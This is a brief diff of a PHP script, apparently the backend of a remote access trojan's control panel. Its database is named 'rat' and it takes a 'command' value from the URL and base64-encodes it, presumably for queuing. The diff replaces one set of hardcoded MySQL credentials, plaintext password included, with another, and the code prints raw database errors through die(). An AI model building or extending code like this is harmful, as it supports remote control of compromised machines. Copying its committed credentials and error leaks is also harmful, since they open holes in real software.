@@ -1,9 +1,7 @@
 <?php
 
-//mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
-//mysql_select_db("nzbkpavw_rat") or die(mysql_error());
-mysql_connect("localhost", "admin", "pq97r") or die(mysql_error());
-mysql_select_db("rat") or die(mysql_error());
+mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
+mysql_select_db("nzbkpavw_rat") or die(mysql_error());
 
 $command = "";
 if (isset($_GET['command'])) $command = base64_encode(str_replace(">>", "", $_GET['command']));
